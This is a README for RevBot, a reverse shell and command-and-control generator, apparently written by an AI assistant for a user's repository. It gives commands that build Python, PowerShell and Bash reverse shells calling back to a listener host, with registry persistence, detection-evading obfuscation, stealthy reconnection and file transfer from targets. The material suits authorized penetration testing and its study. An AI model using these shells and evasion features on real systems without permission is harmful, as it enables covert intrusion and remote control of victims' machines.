![RevBot Logo](https://github.com/exfil0/RevBot/blob/main/REVBOT_LOGO_1.png)

# RevBot

RevBot is an advanced reverse shell generator designed for penetration testing and educational purposes. It supports multiple client languages (Python, PowerShell, Bash) and protocols (TCP, HTTP with WebSocket for C2), with features like encryption (AES, TLS), encoding (base64, zlib), persistence mechanisms, multi-client session management, file transfers with checksums, and obfuscation. The tool emphasizes modularity and scalability, making it easy to extend for custom needs.

## Features

- **Multi-Language Clients**: Generate reverse shells in Python, PowerShell, or Bash, each with tailored capabilities.
- **Protocols**: TCP for traditional reverse shells; HTTP/WebSocket for firewall-evading C2 communication.
- **Encryption**: AES-256-CBC (consistent across clients where supported) and TLS with self-signed certificates.
- **Encoding**: None, base64, or zlib_base64 for data compression and evasion.
- **Persistence**: Platform-specific mechanisms like Windows registry or Linux cron, with debug logging for errors.
- **Session Management**: Handle multiple clients concurrently with commands like `sessions` and `interact <id>`.
- **File Transfers**: Upload/download small files (<1MB) with SHA256 checksums for integrity (basic in PowerShell/Bash).
- **Obfuscation**: Random variable/function names and base64-encoded constants to hinder detection.
- **Logging**: Comprehensive session and command logs for auditing, with stealth options.
- **Modular Structure**: Codebase organized into modules (generator, client, listener, utilities, templates) for easy maintenance and extension.
- **Cross-Platform**: Dynamic platform detection and compatibility with Windows, Linux, and macOS.
- **Enhancements**: Jittered reconnection for stealth, non-blocking HTTP C2 with queuing, and automatic TLS certificate generation.

## Installation

1. **Clone the Repository**:
   ```
   git clone https://github.com/exfil0/RevBot.git
   cd RevBot
   ```

2. **Install Dependencies**:
   The tool requires Python 3.8+ and the following packages:
   ```
   pip install -r revbot/requirements.txt
   ```
   Dependencies include:
   - `pycryptodome` for AES encryption
   - `websockets` for WebSocket C2
   - `prompt_toolkit` for interactive listener prompt

3. **Optional**: Install `openssl` for TLS certificate generation (e.g., on Ubuntu: `sudo apt install openssl`).

## Usage

Run the generator from the root directory:
```
python3 -m revbot --lhost <IP> --lport <PORT> [options]
```

### Examples

- Generate a Python TCP shell with AES encryption and Windows persistence:
  ```
  python3 -m revbot --lhost 192.168.1.100 --lport 4444 --shell-type python_tcp --encryption aes --persistence windows_registry --platform Windows --generate-tls
  ```

- Generate a PowerShell TCP shell with TLS:
  ```
  python3 -m revbot --lhost 192.168.1.100 --lport 443 --shell-type powershell_tcp --encryption tls
  ```

- Generate a Bash TCP shell with base64 encoding:
  ```
  python3 -m revbot --lhost 192.168.1.100 --lport 4444 --shell-type bash_tcp --encoding base64 --platform Linux
  ```

- Generate an HTTP/WebSocket Python client:
  ```
  python3 -m revbot --lhost 192.168.1.100 --lport 8080 --shell-type python_tcp --encryption tls --generate-tls
  ```

Generated files are saved in `revbot_output/` (configurable with `--output-dir`):
- Client script (e.g., `client_python_tcp.py`, `client_powershell_tcp.ps1`, `client_bash_tcp.sh`)
- Listener script (`revbot_listener.py`)
- Logs in `revbot_output/logs/`
- TLS certificates (`server.crt`, `server.key`) if `--generate-tls` is used

### Running the Listener
```
python3 revbot_output/revbot_listener.py
```

The listener supports both TCP and WebSocket connections on the same port. Use commands like:
- `sessions`: List active sessions.
- `interact <id>`: Switch to a session.
- `whoami` or any shell command.
- `upload_file <local_path>`: Upload a small file to the target.
- `download <remote_path>`: Download a small file from the target.
- `exit`: Shut down gracefully.

### Running the Client
- **Python**: `python3 client_python_tcp.py` (supports all features, including WebSocket if HTTP is configured).
- **PowerShell**: `powershell -File client_powershell_tcp.ps1` (basic file transfer, AES supported).
- **Bash**: `./client_bash_tcp.sh` (basic file transfer with base64, no AES).

## Command-Line Options

- `--lhost`: Required. Listener IP address.
- `--lport`: Required. Listener port.
- `--shell-type`: Client type (python_tcp, powershell_tcp, bash_tcp; default: python_tcp).
- `--encoding`: Encoding scheme (none, base64, zlib_base64; default: base64).
- `--encryption`: Encryption type (none, aes, tls; default: none).
- `--aes-key`: Base64-encoded AES key (32 bytes; auto-generated if omitted).
- `--persistence`: Persistence method (none, windows_registry; default: none).
- `--platform`: Target platform (Windows, Linux, Darwin; default: Windows).
- `--output-dir`: Output directory (default: revbot_output).
- `--jitter-min`: Minimum reconnect jitter in seconds (default: 5).
- `--jitter-max`: Maximum reconnect jitter in seconds (default: 15).
- `--generate-tls`: Generate self-signed TLS certificates for TLS encryption.

## Warnings and Limitations
- **PowerShell/Bash Clients**: Limited to basic command execution and file transfers (<1MB). No screenshot support. AES in PowerShell uses .NET AES-256-CBC (not Fernet). Bash uses base64 only (no AES). Use Python for full features.
- **File Transfers**: Limited to small files to avoid buffer issues. Use external tools for larger files.
- **HTTP/WebSocket C2**: Experimental; supports Python clients only. Use `--encryption tls` for secure WebSocket (wss://).
- **Dependencies**: Ensure `pycryptodome`, `websockets`, and `prompt_toolkit` are installed. `openssl` is required for TLS.
- **Legal Use**: RevBot is for authorized testing only. Obtain explicit permission before use. Misuse is illegal.

## Dependencies

See `revbot/requirements.txt`:
```
pycryptodome==3.20.0
websockets==12.0
prompt_toolkit==3.0.47
```

## Contribution

Contributions are welcome! Fork the repo, create a branch, and submit a pull request to the `main` branch. Follow standard GitHub workflow.

## License

MIT License - see [LICENSE](LICENSE) file for details. 

---

This README.md provides a complete overview, ready for your GitHub repo. It's structured for clarity and includes all necessary sections to get users started quickly. If you'd like additions, such as screenshots or more examples, let me know!
